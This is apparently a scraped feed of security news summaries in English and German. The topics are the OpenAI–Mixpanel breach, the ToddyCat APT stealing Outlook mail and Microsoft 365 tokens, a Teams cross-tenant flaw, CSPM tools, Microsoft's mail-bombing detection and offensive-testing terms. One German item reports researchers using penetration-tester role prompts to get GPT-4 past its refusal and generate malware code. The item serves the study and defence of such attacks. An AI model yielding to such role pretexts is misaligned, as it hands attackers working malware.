OpenAI products, OpenAI said. \u201cWe are in the process of notifying impacted organizations, admins, and users directly. While we have found no evidence of any effect on systems or data outside Mixpanel\u2019s environment, we continue to monitor closely for any signs of misuse,\u201d OpenAI said. \u201cThis was not a breach of OpenAI\u2019s systems. No chat, API requests, API usage data, passwords, credentials, API keys, payment details, or government IDs were compromised or exposed.\u201d How should customers react? There are three levels of concern here: which OpenAI API customers are affected, how attackers might use stolen data if they are, and the possibility, however hypothetical, that more valuable data such as API keys or account credentials could be at risk. On the first issue, as noted above, both companies have said they have contacted customers caught up in the breach without specifying how many users are affected. OpenAI has set up an email address customers can use if they have further questions: mixpanelincident@openai.com. Mixpanel has set up an equivalent contact address: support@mixpanel.com\u2060. Nevertheless, if decades of data breaches have taught the world anything it\u2019s that companies don\u2019t always know the full extent of a data breach even when they say they do. For that reason, it would be wise for OpenAI customers who have not been contacted to conduct the same security review as those that have. OpenAI said that customers should be on their guard for phishing attacks targeting breached email addresses and to check that messages that appear to be sent from OpenAI\u2019s domain are genuine. They should also turn on multi-factor authentication (MFA). If phishing sounds generic, in the context of an API connection the dangers are more specific and include more nuanced fake alerts for things like billing, quota messages, and suspicious logins. According to OpenAI, there is no need for customers to rotate or reset account credentials or API keys, which attackers could use to steal data or consume services. Despite this, cautious developers are likely to ignore this and rotate and reset credentials because this removes the risk. Several organizations involved in API and AI security have offered more detailed breakdowns of recommendations in the light of the OpenAI-Mixpanel incident, including Ox Security , and Dev Community . Downstream attack surface OpenAI uses external analytics platforms such as Mixpanel to track how customers interact with models through the API. This includes which models a customer selects plus basic metadata such as location and email ID listed above. It does not track the user \u2018payload\u2019, that is chatbot queries and responses being sent to the model from a browser, which are encrypted. The latest incident underlines that the security of the primary platform is only one part of the risk: secondary platforms and partners are a backdoor that can expose even careful organizations, as some Salesforce customers have seen with data breaches at its partner Salesloft . The attack surface exposed by AI platforms is bigger than it looks, a security and governance challenge enterprises should assess before jumping in with both feet.

      "title": "ServiceNow is in talks to buy identity security firm Veza for over $1 billion: report",
      "summary": "ServiceNow is reportedly in advanced talks to acquire Veza, an identity security startup, for more than $1 billion. For ServiceNow customers deploying AI agents across their organizations, the acquisition would address a critical gap: controlling what those agents can access and do. Veza\u2019s technology maps permissions across enterprise systems, showing exactly which users, applications, and AI agents have access to what data. The deal could be announced next week, The Information reported . The deal would follow ServiceNow\u2019s $2.85 billion acquisition of Moveworks , announced in March. That purchase brought AI assistants and enterprise search capabilities to ServiceNow\u2019s platform. Adding Veza would provide the identity security layer needed to govern those AI systems as they access data across cloud services, SaaS applications, and internal systems. ServiceNow and Veza did not immediately respond to requests for comment. Managing machine identities ServiceNow said in March that it deployed thousands of AI agents for customers across IT, HR, customer service, and security operations. As these agents take on more autonomous tasks, enterprises face mounting pressure to understand what they can access and whether those permissions align with security policies. \u201cServiceNow is trying to build an enterprise platform where AI agents don\u2019t just chat, but actually take meaningful actions inside the business,\u201d said Akshat Tyagi, associate practice leader at HFS Research. \u201cMoveworks gave them a strong automation layer, but trust and governance were the missing pieces. Handing over real-time authority to agents unless identity, permissions, and access rules are rock solid is a bluff no enterprise wants to play.\u201d Veza addresses what security experts call the non-human identity problem. Every AI agent, API integration, and automated workflow creates service accounts and tokens that need management, according to the company. In most enterprises, these machine identities far outnumber human users. Veza\u2019s Authorization Graph technology maps permissions across systems to show not just who has access, but what they can effectively do with that access. According to its website, the company manages more than 20 billion permissions for customers, including Blackstone, Expedia, and Workday. Veza has raised $235 million since its inception in 2020 and employed more than 190 people as of April 2025. Tyagi said existing identity and access management tools were designed for human accounts but struggle with machine identities, API keys, and autonomous agents making real-time decisions. \u201cThis creates blind spots around privilege sprawl and cross-system access paths,\u201d he said. The two companies already work together. ServiceNow Ventures invested in Veza in August 2023 alongside Capital One Ventures. The companies have more than 250 joint customers, the report added. Customer integration questions For those joint customers, the acquisition would mean significant changes in how the two systems work together. Enterprises using both ServiceNow and Veza today run them as separate systems. Integration would allow ServiceNow\u2019s AI agents to natively query and enforce access policies based on Veza\u2019s permission intelligence, without customers building custom connections. That integration will take time, according to Tyagi. \u201cServiceNow is already a big and complex system, and adding a full identity security engine won\u2019t be instant plug-and-play,\u201d he said. Customers should expect changes to licensing and the introduction of new modules as the two platforms merge. Organizations using Veza without ServiceNow will want clarity on whether the product remains available as a standalone offering. Those using ServiceNow with other identity vendors will need to know if their existing tools remain supported or if ServiceNow will push customers toward its own integrated stack. ServiceNow unveiled AI agents for security and risk management at its Knowledge 2025 conference in May, positioning them as tools for autonomous enterprise defense. Veza would provide the authorization controls those security agents need to safely investigate and remediate threats across systems. Veza treats access as a relationship problem, connecting identities, permissions, and data to show effective access rather than just theoretical permissions, according to Tyagi. Market implications The acquisition would give ServiceNow a more complete offering against rivals building AI-powered enterprise platforms. Salesforce, Microsoft, and Oracle all offer AI agents, but none had combined front-end automation with identity security in the way ServiceNow was attempting with Moveworks and Veza, according to Tyagi. \u201cThis deal can shake up the identity security landscape because it pulls deep authorization intelligence into a major enterprise platform instead of keeping it as a standalone specialty,\u201d Tyagi said. Standalone identity vendors like CyberArk, SailPoint, and Okta may face pressure to find their own platform partnerships or acquisition targets, he said.",

IB Photography \u2013 shutterstock.com Forscher von Kaspersky Labs haben festgestellt, dass sich die APT-Gruppe (Advanced Persistent Threat) ToddyCat jetzt darauf spezialisiert hat, Outlook-E-Mail-Daten und Microsoft 365-Zugriffstoken zu stehlen. Demnachhat die Hackerbande ihr Toolkit Ende 2024 und Anfang 2025 weiterentwickelt, um nicht nur wie bisher Browser-Anmeldedaten zu stehlen. Zuvor hatte die Gruppe hochkar\u00e4tige Organisationen in Asien und Europa ins Visier genommen, indem sie sich in mit dem Internet verbundene Microsoft Exchange-Server hackte. In dem k\u00fcrzlich ver\u00f6ffentlichten Forschungsbericht beschreibt Kaspersky, wie die APT-Gruppe Unternehmensumgebungen (lokale Exchange- oder Cloud-basierte E-Mail-Systeme) kompromittiert. Anschlie\u00dfend setzt sie clevere Post-Exploit-Methoden ein, um die E-Mail-Korrespondenz zu exfiltrieren, ohne die \u00fcblichen Alarme auszul\u00f6sen. Outlook im Fadenkreuz Ziel der Angreifer ist es dabei, sich Zugriff auf tats\u00e4chliche E-Mail-Daten verschaffen. ToddyCat setzt dazu ein Tool namens TCSectorCopy ein \u2013 ein C++-Dienstprogramm, das die Festplatte als schreibgesch\u00fctztes Ger\u00e4t \u00f6ffnet und die Offline-Speicherdateien (OST) von Outlook kopiert, wobei alle Dateisperrmechanismen, die Outlook m\u00f6glicherweise durchsetzt, umgangen werden. Sobald die OST-Dateien extrahiert sind, werden sie in XstReader eingespeist \u2013 einen Open-Source-Viewer, der OST/PST-E-Mail-Archive analysieren kann. Dadurch erhalten die Angreifer Zugriff auf den gesamten Inhalt der Unternehmenskorrespondenz. In Umgebungen, die Cloud-E-Mail wie Microsoft 365 verwenden, versucht das neue ToddyCat, OAuth 2.0-Zugriffstoken zu sammeln. Wie Kaspersky erkl\u00e4rt, k\u00f6nnen Angreifer OAuth 2.0-Token aus dem Browser eines Opfers extrahieren und so auf Unternehmens-E-Mails zugreifen, selbst wenn sie sich nicht mehr im kompromittierten Netzwerk befinden. \u201eIn mindestens einem Fall blockierte Sicherheitssoftware den Versuch, Tokens zu extrahieren\u201c, so die Security-Spezialisten. \u201eUnbeeindruckt davon, wechselten die Angreifer zu einem Memory-Dump-Tool (ProcDump von Sysinternals), um die Tokens direkt aus dem laufenden Outlook-Prozess zu extrahieren.\u201c Der Bericht zeigt eine Reihe von b\u00f6sartigen Dateinamen, Pfaden und Verzeichnissen als Indikatoren f\u00fcr Kompromittierungen (IOCs), um die Erkennungsbem\u00fchungen zu unterst\u00fctzen. Die Verlagerung von ToddyCat hin zum E-Mail-Diebstahl passt zu einem Trend, der bereits in fr\u00fcheren Kampagnen zu beobachten war: ma\u00dfgeschneiderte Backdoors, verdeckte Traffic-Tunnel und langfristige Spionagetaktiken gegen Regierungs- und Milit\u00e4rnetzwerke in Europa und Asien. Von Browsern zu Dom\u00e4nencontrollern Bereits zwischen Mai und Juni 2024 hatten Kaspersky-Forscher eine neue Version des ToddyCat-Toolkits entdeckt, die in PowerShell geschrieben ist und direkt von Dom\u00e4nencontrollern unter privilegierten Benutzerkonten aus arbeitet. Mit diesem Update wurde der Umfang des Angriffs von Chrome und Edge auf Firefox-Browserdaten ausgeweitet. Das Skript verwendete eine geplante \u201eRun\u201c-Aufgabe, erstellte ein lokales Verzeichnis und stellte dann (\u00fcber SMB) eine Verbindung zu Benutzer-Host-Verzeichnissen im gesamten Netzwerk her. Nach der Verbindung kopierte es Browser-Dateien (Cookies, gespeicherte Anmeldedaten, Verlauf usw.) f\u00fcr die Offline-Analyse. Durch die Erfassung von Rohdaten des Browsers, einschlie\u00dflich Windows-DPAPI-Verschl\u00fcsselungsschl\u00fcsseln, konnte ToddyCat gespeicherte Anmeldedaten entschl\u00fcsseln und diese m\u00f6glicherweise wiederverwenden, um den Zugriff zu erweitern. Zudem gab es eine Kampagne im April 2025, bei der die Gruppe eine Schwachstelle in der Antiviren-Engine von ESET ausnutzte, um b\u00f6sartige Module \u00fcber die vertrauensw\u00fcrdigen Prozesse des Produkts auszuf\u00fchren.

      "title": "Microsoft Teams\u2019 guest chat feature exposes cross-tenant blind spot",
      "summary": "A newly highlighted flaw in Microsoft\u2019s cross-tenant collaboration model shows that once a user accepts a guest invitation in Teams, their Defender for Office 365 protections are dropped entirely, leaving them exposed inside an external tenant even while logged in with their home account. According to Ontinue threat researcher Rhys Downing, one of Microsoft\u2019s recently enabled features, \u201cMC1182004,\u201d that allows Teams users to initiate chats with any email address, opens an attack vector for threat actors who know cross-tenant security limitations. \u201cMany organizations assume their controls \u2018follow\u2019 the user wherever they go,\u201d said Julian Brownlow Davies , senior vice president, offensive security strategy & operations at Bugcrowd. \u201cIn reality, attackers can spin up a poorly secured tenant, invite your users in with what looks like a perfectly legitimate Microsoft Teams email, and deliver links and files that never touch your own Defender stack at all.\u201d This means the full suite of Defender protections, including URL scanning, safe links, file sandboxing, and zero-hour auto purge, can simply be disabled, turning a harmless-looking collaboration invite into an attack path. Microsoft did not immediately respond to CSO\u2019s request for comments. New default triggers architectural flaw Downing explained in a blog post that the issue isn\u2019t a software bug in Teams, but an architectural reality of cross-tenant collaboration. When a user joins another tenant as a guest, the hosting (resource) tenant\u2019s security settings apply\u2013not the user\u2019s original (home) tenant. As a result, all protections provided by Defender for Office 365 are bypassed if the resource tenant has them disabled or never had them in the first place. Making an attack easier is the default-enabled feature in Teams, MC1182004 , that allows users to start a chat with any email address, even if the recipient isn\u2019t yet part of Teams. That means attackers can simply spin up a Microsoft 365 tenant, invite victims via email, and deliver phishing links or malware-all without triggering the victim\u2019s own security stack. Davies echoed Downing\u2019s argument that this is an architectural consequence of how cross-tenant collaboration works. \u201cAt Bugcrowd, we see the same pattern across crowdsourced testing programs, particularly in our Red Team engagements: much of the risk now lives in the connectivity between tenants, identity systems, and collaboration tools, rather than in the individual apps themselves,\u201d he said. Mitigations include vetting collaborations Jason Soroko, senior fellow at Sectigo, warns that this is not a mere \u201cbypass bug,\u201d but a blind spot in many organizations\u2019 mental model of cross-tenant risk. \u201cSecurity teams should respond by treating external guest access as a trust boundary that needs explicit governance rather than a convenience feature that can stay on by default,\u201d he said. Restricting B2B guest invitation to a vetted allow-list of trusted partner domains, and implementing cross-tenant access policies in Microsoft Entra ID to block suspicious guest-tenant access was recommended by Downing to stay ahead of this inherent threat. Another key mitigation includes disabling the default \u201cchat with Anyone\u201d feature in Teams, which allows unsolicited external invitations to reach users. This is a practical step for many organizations that can simply do so through the Teams admin center by tightening external policies. Together with the Entra ID warning from September, the disclosure underscores that a real danger sits in the gaps across Microsoft tenants, where convenience defaults and misplaced trust continue to outpace security.",

      "title": "CSPM buyer\u2019s guide: How to choose the best cloud security posture management tools",
      "summary": "Cloud security posture management (CSPM) explained Cloud security posture management (CSPM) combines threat intelligence, detection, and remediation that works across complex collections of cloud-based applications. After companies move to the cloud, many are under the impression that their cloud hosting providers are solely responsible for security, a misconception that can lead to data breaches and other security issues. While the responsibility for securing cloud infrastructure falls to cloud services providers, it\u2019s up to customers to configure the cloud and secure their applications and sensitive corporate data. But securing cloud-based apps and data isn\u2019t simple as there are many threat vectors that operate across neat defensive boundaries. This is why many enterprises have found a need to expand their posture management to more comprehensive products such as cloud-native application protection platforms (CNAPP) or secure service edge (SSE) product lines. CNAPP integrates CSPM with other tools that include cloud access security brokers (CASBs) and tools that directly protect cloud workloads, APIs and infrastructure and include those from vendors such as Wiz, Palo Alto Networks\u2019 Cortex line, Tenable, Crowdstrike and others. SSE products are more network-focused and integrate CSPM with a different set of tools including software-defined wide area networking, secure web gateways and zero trust network access and include vendors such as Zscaler, Cisco, Palo Alto Networks\u2019 Prisma line, Fortinet and Netskope. [ Download our editors\u2019 PDF cloud security posture management (CSPM) enterprise buyer\u2019s guide today! ] In this buyer\u2019s guide Cloud security posture management (CSPM) explained What to look for in cloud security posture management (CSPM) tools Leading vendors for cloud security posture management (CSPM) What to ask your cloud security posture management (CSPM) provider Essential reading That\u2019s where CSPM tools can help. These tools continuously and automatically check for misconfigurations that can result in data leaks and data breaches. CSPM tools manage cloud security risks on an ongoing basis and ensure compliance in the cloud so enterprises can continuously make any necessary changes. \u201cCSPM solutions use best practices and compliance (PCI, SOC2, etc.) templates to identify drifts and insecure configurations in cloud infrastructure (AWS, Azure, and Google Cloud) in the compute, storage, and network areas,\u201d says Andras Cser , a principal analyst at Forrester Research. \u201cCSPM tools can alert and optionally remediate the insecure configurations.\u201d CSPM tools look at workloads to see what\u2019s happening and they provide context, so organizations know which of the vulnerabilities or issues is most important, says Charlie Winckless , a senior director analyst at Gartner. \u201cThese tools enable companies to prioritize which risks are real, which risks are important, and which risks they may be able to delay fixing a little bit,\u201d he says. Cloud technologies have been classified as infrastructure as a service (IaaS), platform as a service (PaaS) and software as a service (SaaS). The differences among these three designations are becoming blurred to the point where the labels don\u2019t have much meaning anymore. As enterprises purchase more diverse cloud offerings, the notion of having a single tool such as CSPM that covers all these bases becomes appealing. What to look for in cloud security posture management (CSPM) tools Organizations evaluating various CSPM tools should ensure that they cover all the cloud platforms they\u2019re using, says Winckless. \u201cYou want to be able to normalize the configuration risks across the major cloud platforms,\u201d he says. \u201cMost organizations that are purchasing these tools will probably be multicloud. They\u2019ll be using at least two clouds, maybe more, since the cloud providers themselves do offer some of this functionality built into their platforms.\u201d Philip Bues, cloud security research manager at IDC, says the new reality for most organizations is a hybrid multicloud environment, \u201cso you want something that\u2019s going to be able to give you really deep visibility throughout all the environments and workloads that you have. And that\u2019s what the CSPM solution should be able to provide you.\u201d Other features organizations should look for in CSPM tools include the following: Comprehensive threat detection: Because threats in multicloud environments are complex, these tools must gather threat intelligence from multiple sources to give companies clear views of their risks. Integrated data security: Keeping data safe in the cloud requires a multipronged defense that gives companies deep visibility into the state of their data. This includes enabling organizations to monitor how each storage bucket is configured across all their storage services to ensure their data isn\u2019t inadvertently exposed to unauthorized applications or users. Automated alert remediation: Organizations must ensure that the CSPM tools they select can automate routine security monitoring, audits, and remediations across their cloud environments. This allows security teams to prioritize and remediate the risks that can potentially cause the most damage. Benefits of CSPM tools CSPM tools offer multiple benefits that help companies boost security, minimize their risk exposure in cloud environments, and reduce costs. These benefits include: Proactively identifying and addressing risks before cybercriminals can exploit them using real-time visibility and automatic detection of vulnerabilities, misconfigurations, and security gaps. Continuously monitor configurations as they relate to industry benchmarks and standards to ensure compliance with best practices and regulations. Automating policy enforcement and remediation, which cuts the time and expense of manually resolving security issues across cloud environments. Integrating devops workflows with CSPM processes to embed security throughout the software development life cycle. Pitfalls of CSPM tools There are some pitfalls that companies need to be aware of when it comes to CSPM tools, including: Not understanding the requirements of CSPM tools: This is one of the biggest mistakes that organizations can make when they\u2019re shifting workloads to the cloud because things that weren\u2019t connected before are now interconnected, says IDC\u2019s Bues. The best way to implement CSPM tools is to ensure teams receive the proper training and proper awareness for how this solution is supposed to work within the environment. \u201cYou don\u2019t want to have the security team with little or no cloud experience or developers with limited security experience trying to manage this new CSPM solution,\u201d he says. \u201cYou should have the developers and the security team working together because everyone has different needs.\u201d Not opting for a multicloud CSPM tool: Another mistake companies make is selecting tools that offer a one-size-fits-all approach offered by public cloud vendors that don\u2019t offer a unified view across all their cloud environments. Organizations should opt for CSPM tools that provide multicloud monitoring and protection. Thinking they\u2019re too small or not mature enough: A company that assumes it\u2019s too small or not mature enough to consider security will always put the business at risk as it typically only thinks about security after an issue or breach occurs. However, companies of all sizes should ensure they protect their assets across teams by implementing CSPM tools. Leading vendors for cloud security posture management (CSPM) Vendors have been incorporating CSPM functions into their overall CNAPP or SSE platforms, including CrowdStrike, Palo Alto Networks, Wiz, Zscaler and Tenable. This means that the modern standalone CSPM tool has all but disappeared. One extreme example is Check Point Systems, who has gotten out of CSPM entirely and has taken its CNAPP efforts to integrate with Wiz\u2019 product line. But it is important to start with this function as you investigate how to protect your cloud estate, and to help with these efforts, we have highlighted a few of the CSPM tools based on discussions with analysts and our own independent research. SentinelOne Singularity CSPM is part of a collection of integrated modules that together comprise a comprehensive CNAPP solution. You can pinpoint cloud misconfigurations and monitor changes continuously to public clouds from AWS, Azure and Google Cloud. It also includes an offensive detection engine called Verified Exploit Paths and AI-based threat-detection research to help augment its protective features. Sweet.Security Runtime CNAPP\u2019s CSPM module is just part of a comprehensive CNAPP solution that offers application, data and API security modules. It monitors changes in near real-time and helps to remediate cloud workload misconfigurations and protects development pipelines. It combines its runtime instrumentation with other metadata to provide overall risk assessment scoring. It also offers a unified management of security issues, such as exposed APIs that are linked to misconfigured identities. Tenable CSPM is part of its overall cloud security platform, which integrates a wide collection of tools including the traditional CNAPP suite along with more development-oriented protection for AI, code pipelines, data and threat detection tools. It provides continuous security scans across AWS, Azure and Google Cloud along with producing audit reports and integration with its cloud infrastructure entitlement management tools as well. Questions to ask your cloud security posture management (CSPM) provider When investigating the best CSPM fit for your enterprise security needs, ask potential vendors these questions: How can you calculate your baseline so you can track changes to your cloud-based assets? Does the CSPM platform work for all three of the major public clouds (Amazon Web Services, Google Cloud, and Microsoft Azure) as well as various Kubernetes and other container-based implementations? What about support for common SaaS apps such as Box, Salesforce, ServiceNow, and Workday? Each product\u2019s coverage varies. Some products place agents in your cloud, some use read-only access to scan your environment and resources, and some have writing access to enable changes to remediate issues in your accounts. How real-time is it for notifications about these changes, policy violations, and other unusual events? Does it track misconfigured weak security groups, remote access, app control mistakes, and network changes? All cloud providers offer built-in activity monitoring, but if you use multiple clouds, you want your CSPM platform to parse this rich supply of data and make actionable sense of it. How real-time is it to automate remediation? The best CSPM platforms will continuously scan for vulnerable systems and some offer ways that they can detect when a new virtual machine has created an insecure situation for example. What other security and notification tools does it integrate with, such as security information event management (SIEM) and security orchestration, automation, and response (SOAR) ? How many compliance/auditing reporting frameworks are supported on each cloud provider? Each tool supports a different framework collection, which isn\u2019t necessarily the same across all the clouds either to make things harder for you, too. What is the cost? Some vendors offer a limited free trial or tier; others charge per host or in more complex ways that might mean a surprise when the bill comes due. Few are like Sysdig that offer a public and transparent pricing webpage.

      "summary": "Forscher tricksen Chatbots aus, sto\u00dfen aber auf unzuverl\u00e4ssige Ergebnisse. Ascannio / Shutterstock Cyberkriminelle versuchen bereits seit geraumer Zeit, mit Hilfe von Large Language Models (LLM) ihre dunklen Machenschaften zu automatisieren. Aber k\u00f6nnen sie schon b\u00f6sartigen Code generieren, der \u201emarktreif\u201c und bereit f\u00fcr den operativen Einsatz ist? Das wollten die Forschenden von Netskope Threat Labs herausfinden, indem sie Chatbots dazu verleiteten, Schadcode zu erstellen. Wie Netskope-Threat-Hunter Jan Michael Alcantara in einem Blogbeitrag erkl\u00e4rt, nahmen die Researcher dazu zwei separate Tests vor: Zun\u00e4chst veranlassten sie GPT-3.5-Turbo und GPT-4 dazu, einen Python-Code f\u00fcr die Prozessinjektion und die Beendigung aller AV/EDR-bezogenen Prozessen zu generieren. Dieser Test sollte das Potenzial f\u00fcr die autonome Codegenerierung best\u00e4tigen. Das \u00e4ltere GPT-3.5-Turbo begann Alcantara zufolge auf Anfrage sofort, den Schadcode zu generieren. Der Nachfolger GPT-4 lehnte die direkte Anweisung aufgrund seiner Sicherheitsmechanismen ab. Er musste stattdessen mithilfe rollenbasierter Prompts ausgetrickst werden. So gaukelten die Experten dem Modell vor, dass es einen Penetrationstester unterst\u00fctzt. Damit lie\u00df sich der Chatbot dazu bewegen, den unerw\u00fcnschten Code zu erzeugen. Dieser konnte dann f\u00fcr Techniken, wie Prozessinjektion und um Antiviren-/EDR-bezogene Prozesse zu beenden, genutzt werden. Schadcode ist nur der Anfang Schadcode durch LLMs zu erzeugen, ist aber nur ein erster Schritt, wie die Experten feststellen. Malware muss zus\u00e4tzlich noch Erkennungssysteme umgehen und in realen Umgebungen zuverl\u00e4ssig funktionieren muss. Daf\u00fcr sollten die Modelle funktionsf\u00e4higen Python-Code entwickeln, der Virtualisierungsumgebungen erkennt und entsprechend \u201eTrue\u201c oder \u201eFalse\u201c zur\u00fcckgibt. Dieses Skript wurde dann anschlie\u00dfend in drei unterschiedlichen Szenarien getestet: einer VMware Workstation, einer AWS Workspace VDI und einer herk\u00f6mmlichen physischen Umgebung. Ein Skript hatte den Test nur dann bestanden, wenn es absturzfrei lief und in der korrekten Umgebung das richtige Signal sendete. In virtualisierten Umgebungen musste es korrekt \u201eTrue\u201c, sowie auf dem physischen Host \u201eFalse\u201c ausgeben GPT-4 und GPT-3.5-Turbo zeigten in der VMware-Umgebung nur m\u00e4\u00dfige Zuverl\u00e4ssigkeit und schnitten in AWS Workspace VDI noch deutlich schlechter ab, da ihr Code nicht an moderne Cloud-Umgebungen angepasst werden konnte. In einer standardisierten physischen Umgebung lieferten beide Modelle hingegen sehr gute Resultate. Umgebung Zuverl\u00e4ssigkeitsbewertung des Python-Skripts (GPT-4) Zuverl\u00e4ssigkeitsbewertung des Python-Skripts (GPT-3.5-Turbo) VMWare Workstation 10/20 12/20 AWS Workspace VDI 3/20 2/20 Real Environment 18/20 18/20 GPT-5 outperformt \u00e4ltere Modelle Laut den Autoren ist der von GPT-4 und GPT-3.5-Turbo generierte Python-Code f\u00fcr praktische Eins\u00e4tze damit noch zu fehleranf\u00e4llig. Der von GPT-5 erstellte Code schnitt hingegen mit einer Erfolgsquote von 90 Prozent deutlich besser ab. Sie kommen daher zu dem Ergebnis, dass der Engpass in puncto Codezuverl\u00e4ssigkeit sich rasch aufzul\u00f6sen scheint. Allerdings hat die gesteigerte Leistungsf\u00e4higkeit von OpenAIs neuerem Modell auch eine Kehrseite, n\u00e4mlich in Form strengerer Sicherheitsmechanismen, die \u00fcberwunden werden m\u00fcssen: In den Tests lieferte GPT-5 statt potenziell sch\u00e4dlichem Code eine sichere Alternative, die dem eigentlichen Zweck widerspricht. Die Fachleute bewerten ihn deshalb auch im Kontext komplexer Angriffsketten als unzuverl\u00e4ssig. Unterm Strich sind die Ergebnisse f\u00fcr Sicherheitsverantwortliche damit laut den Forschenden positiv: LLM-basierte Malware kann zwar dynamischen Code erzeugen, scheitert jedoch h\u00e4ufig an technischen Anforderungen wie der Virtualisierungsumgehung. Wegen der geringen Erfolgsquoten und der hohen Unzuverl\u00e4ssigkeit ist damit die vollst\u00e4ndige Automatisierung des Malware-Lebenszyklus \u2013 noch \u2013 nicht m\u00f6glich.",

      "summary": "In today's digital age, email remains a critical communication tool for businesses and individuals. However, with the increasing sophistication of cyberattacks, email security has become more important than ever. One such threat that has been growing is the email bombing, a form of net abuse that sends large volumes of email to an address to overflow the mailbox, overwhelm the server, or distract attention from important email messages indicating a security breach. Email bomb - Wikipedia Understanding Email Bombing Email bombing , typically involves subscribing victims to a large number of legitimate newsletter and subscription services. Each subscription service sends email notifications, which in aggregate create a large stream of emails into the victim\u2019s inbox, making email triage for legitimate emails very difficult. This form of attack is essentially a denial-of-service (DDOS) on the victim's email triaging attention budget. Hybrid Attacks More recently, email subscription bombs have been coupled with simultaneous lures on Microsoft Teams, Zoom, or via phone calls. Attackers impersonate IT support and offer to help solve the email problem caused by the spike of unwanted emails, ultimately compromising the victim's system or installing malware on their system. This type of attack is brilliant because it creates a sense of urgency and legitimacy, making victims more likely to accept remote assistance and inadvertently allow malware planting or data theft. Read about the use of mail bombs where threat actors misused Quick Assist in social engineering attacks leading to ransomware | Microsoft Security Blog. Incidence and Purpose of Email Bombing Email bombing attacks have been around for many years but can have significant impacts on targeted individuals, such as enterprise executives, HR or finance representatives. These attacks are often used as precursors to more serious security incidents, including malware planting, ransomware, and data exfiltration. They can also mute important security alerts, making it easier for attackers to carry out fraudulent activities without detection. New Detection technology for Mail Bombing attacks To address these types of attacks Microsoft Defender has now released a comprehensive solution involving a durable block to limit the influx of emails, the majority of which are often spam. By intelligently tracking message volumes across different sources and time intervals, this new detection leverages historical patterns of the sender and signals related to spam content. It prevents mail bombs from being dropped into the user\u2019s inbox and the messages are rather sent to the Junk folder (of Outlook). Note: Safe sender lists in Outlook continue to be honored, so emails from trustworthy sources are not unexpectedly moved to the Junk folder (in order to prevent false positives). Since the initial rollout that started in early May, we\u2019ve seen a tremendous impact in blocking mail bombing attacks out of our customers\u2019 inboxes: Statistic: Average 20-30K mail bombs blocked daily across 200-300 users. How to leverage new \u201cMail bombing\u201d detection technology in SOC experiences 1. Investigation and hunting: SOC analysts can now view the new Detection technology as Mail bombing within the following surfaces: Threat Explorer, Email entity page and Advanced Hunting empowering them to investigate, filter and hunt for threats related to mail bombing. 2. Custom detection rule : To analyze the frequency and volume of attacks from mail bombing vector, or to have automated alerts configured to notify SOC user whenever there is a mail bombing attack, SOC analysts can utilize the custom detection rules in Advanced hunting by writing a KQL query using data in DetectionMethods column of EmailEvents table. Here\u2019s a sample query to get you started: EmailEvents | where Timestamp > ago(1d) | where DetectionMethods contains \"Mail bombing\" | project Timestamp, NetworkMessageId, SenderFromAddress, Subject, ReportId The SOC experiences are rolled out worldwide to all customers. Conclusion Email bombs represent an incidental threat in the world of cybersecurity. With the new detection technology for Mail Bombing, Microsoft Defender for Office 365 protects users from these attacks and empowers Security Operations Center Analysts to ensure to gain visibility into such attacks and take quick actions to keep organizations safe! Note: The Mail bombing protection is available by default in Exchange Online Protection and Microsoft Defender for Office 365 plans. This blog post is associated with Message Center post MC1096885.

      "title": "From Compliance to Covert Ops: Demystifying the Offensive Security Landscape",
      "summary": "The merits of deploying offensive testing to strengthen an organization\u2019s security posture are well-understood by today\u2019s security leadership. Much to the relief of defenders, obtaining approval for an offensive security exercise has never been easier. However, the process of selecting the most appropriate offensive testing solution requires untangling overlapping definitions and vaguely defined terminology that leaves security teams more confused than when they started. How is an Adversary Emulation different from a Red Team ? What about this new Breach and Attack Simulation (BAS) tool that has been receiving great publicity recently? Would it be simpler to just invest in a Penetration Test instead? To help break all this down, we will provide a framework to understand the value proposition of different offensive security services from a defender\u2019s perspective, focusing on the core assumptions underlying each solution\u2019s methodology. We will also identify important factors that help with narrowing down which form of offensive testing is best suited for your organization. The Ends and The Means To understand the differences between types of offensive testing, consider the following: Are defenses being tested against attacks in general, or specific adversaries? Are offensive techniques being emulated for maximum realism, or simulated for rapid validation? This framework allows us to classify offensive security services into four general categories. Attack Adversary Simulation Breach and Attack Simulation (BAS) TTP-Agnostic Red Teaming Emulation Penetration Testing TTP-Driven Red Teaming Although there is often methodological overlap between the four quadrants, this model can be used to make sense of industry terminology from a defender\u2019s point of view by focusing on the how and the why of conducting offensive security testing. To use a domestic analogy, let\u2019s assume you want to ensure your home is safe from being broken into. The type of test you choose will dictate what you learn about your security posture. Breach and Attack Simulation (BAS) focuses on the repeatable execution of individual attacks, usually in an automated fashion, targeting specific defensive capabilities, much like trying the door handle every few hours to make sure the lock is engaged. Crucially, the focus is on ensuring that the lock\u2019s status is validated, and not on the specific mechanics of how the handle was engaged. Penetration Testing , on the other hand, is a time-bound, scoped assessment targeting a specific goal, usually with the full awareness of the internal security team. This is like hiring a professional burglar to attempt breaking in within a set duration, but with certain limits - lock picking is okay, but smashing the window is out of bounds! Red Teaming , whether TTP-driven or not, is a comprehensive exercise that targets an organization similar to how a real-life adversary would, often with no warning provided to defenders. Continuing our analogy, this is similar to tasking professionals with breaking into your house from start to finish, like a real burglar, with few restrictions. In this situation, you may want to smash the window to see if the home security service you paid for is worth the money. The Right Tool for the Job When selecting an offensive security service, organizations should first ensure that foundational defensive controls are in place. Engaging a Red Team without having validated basic controls will surface findings that would likely also have been discovered with Penetration Testing. First, leverage BAS to identify gaps and misconfigurations and validate the functionality of security tools. Subsequently, conducting Penetration Tests on internal networks and web applications can unearth additional vulnerabilities and attack paths in custom software and business logic. Finally, engaging in a Red Team will test defenders\u2019 readiness to combat a targeted, real-world attack by a sophisticated adversary. The choice of whether a Red Team is TTP-agnostic or TTP-driven (Adversary Emulation vs Simulation) will depend on whether you are concerned about specific threat actors or groups and are interested in testing tailored defenses, such as detection rules for TTPs used to target your industry. While it is tempting to jump directly to the \u201cmost realistic\u201d form of security testing, this misconception results in limited value being obtained from an offensive security exercise. Adversaries will take the path of least resistance into an organization - before smashing the window, a burglar will pick your lock, but before that, they will certainly just try the handle.",

